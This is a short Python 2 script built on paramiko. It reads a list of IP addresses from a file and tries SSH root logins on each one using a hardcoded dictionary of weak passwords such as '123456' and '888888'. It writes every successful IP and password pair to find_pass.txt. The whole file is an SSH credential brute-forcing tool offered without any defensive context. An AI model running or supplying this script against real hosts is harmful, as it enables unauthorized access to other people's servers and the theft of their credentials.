import paramiko
import os
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#client.connect('192.168.8.248', 22, username='root', password='password', timeout=4)
 
def write_log(ip_str,password):
	log_file = "find_pass.txt"
	file = open(log_file,'a')
	file.write(ip_str+'|'+password+os.linesep)
	file.close()
 
def ssh_connect(ip,username,password):
	global client
	try:
		client.connect(ip, 22, username=username, password=password, timeout=4)
		write_log(ip,password)
		print "ip: %s is login success,password is %s" % (ip,password)
	except:
		print "ip: %s login has no pass" % ip
		#client.close()
		
if __name__=='__main__':
	pwd_dic = ['123456','111111','222222','888888','999999','666666']
	if os.path.exists('ip_log.txt'):
		for ip in open("ip_log.txt").readlines():
			for pwd in pwd_dic:
				ssh_connect(ip,'root',pwd)
	else:
		print "ip_log is not exists"
	client.close()
	